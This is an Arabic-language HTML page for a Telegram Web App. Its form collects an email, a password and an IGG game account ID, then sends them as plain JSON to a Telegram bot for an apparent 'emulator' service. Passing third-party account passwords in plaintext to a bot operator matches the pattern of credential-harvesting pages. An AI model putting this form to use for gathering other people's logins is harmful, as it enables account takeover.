<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>استمارة تسجيل الحساب</title>
    <!-- مكتبة تليجرام الأساسية (ضرورية جداً) -->
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #151e27;
            color: #ffffff;
            padding: 20px;
            text-align: center;
        }
        .container {
            max-width: 400px;
            margin: 0 auto;
            background: #212d3b;
            padding: 20px;
            border-radius: 12px;
            box-shadow: 0 4px 10px rgba(0,0,0,0.3);
        }
        h2 { margin-bottom: 20px; }
        .input-group {
            margin-bottom: 15px;
            text-align: right;
        }
        label { display: block; margin-bottom: 5px; font-size: 14px; color: #aaaaaa; }
        input {
            width: 100%;
            padding: 10px;
            border-radius: 6px;
            border: 1px solid #3b4c5d;
            background: #1c2733;
            color: #fff;
            box-sizing: border-box;
        }
        button {
            width: 100%;
            padding: 12px;
            border: none;
            border-radius: 6px;
            background-color: #2ea6ff;
            color: #fff;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            margin-top: 10px;
        }
        button:hover { background-color: #1a93e8; }
    </style>
</head>
<body>

<div class="container">
    <h2>استمارة تسجيل الحساب 📊</h2>
    <form id="registrationForm">
        <div class="input-group">
            <label>البريد الإلكتروني (Email):</label>
            <input type="email" id="email" required placeholder="example@email.com">
        </div>
        <div class="input-group">
            <label>كلمة السر (Password):</label>
            <input type="password" id="password" required placeholder="••••••••">
        </div>
        <div class="input-group">
            <label>معرف الحساب (IGG ID):</label>
            <input type="text" id="igg_id" required placeholder="12345678">
        </div>
        <button type="submit" id="submitBtn">إرسال إلى المحاكي 🚀</button>
    </form>
</div>

<script>
    // تهيئة تطبيق تليجرام
    const tg = window.Telegram.WebApp;
    tg.expand();

    const form = document.getElementById('registrationForm');

    form.addEventListener('submit', function(e) {
        e.preventDefault();

        const data = {
            email: document.getElementById('email').value,
            password: document.getElementById('password').value,
            igg_id: document.getElementById('igg_id').value
        };

        // إرسال البيانات للبوت وإغلاق النافذة
        tg.sendData(JSON.stringify(data));
    });
</script>

</body>
</html>
